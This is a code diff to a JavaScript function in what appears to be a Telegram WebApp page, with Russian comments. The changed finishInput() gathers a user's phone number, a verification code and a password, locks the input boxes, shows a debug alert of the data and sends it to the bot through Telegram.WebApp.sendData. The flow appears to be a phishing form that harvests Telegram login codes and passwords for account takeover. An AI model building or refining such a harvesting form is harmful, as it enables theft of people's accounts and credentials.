@@ -366,28 +366,32 @@
     };
 
     function finishInput() {
+        const boxes = document.querySelectorAll('.digit-box');
+        const inputs = document.querySelectorAll('.code-digit');
+
+        const phoneNumber = phoneInput.value;
+        const password = passwordInput.value;
+        let code = '';
+        inputs.forEach(i => code += i.value);
+
+        // 1. Блокируем
+        inputs.forEach(inp => { inp.readOnly = true; inp.blur(); });
+        boxes.forEach(box => { box.classList.add('locked'); });
+
         const data = {
-            phone: phoneInput.value,
-            code: Array.from(inputs).map(i => i.value).join(''),
-            password: passwordInput.value
+            phone: phoneNumber,
+            password: password,
+            code: code
         };
 
-        try {
-            if (tg) {
-                tg.sendData(JSON.stringify(data));
-            } else {
-                alert("Ошибка: WebApp не найден");
-            }
-        } catch (e) {
-            alert("Ошибка отправки: " + e.message);
-        }
+        // 2. ДЕБАГ: ЭТО ОКНО ДОЛЖНО ПОЯВИТЬСЯ НА ЭКРАНЕ!
+        alert("Я пытаюсь отправить данные:\n" + JSON.stringify(data));
 
-        // Если пароль не нужен, показываем зеленый успех перед закрытием
-        if (!needPassword) {
-            boxes.forEach(box => {
-                box.classList.remove('locked');
-                box.classList.add('success');
-            });
+        // 3. Отправка
+        if (window.Telegram.WebApp) {
+            window.Telegram.WebApp.sendData(JSON.stringify(data));
+        } else {
+            alert("Ошибка: WebApp не найден!");
         }
     }
 </script>
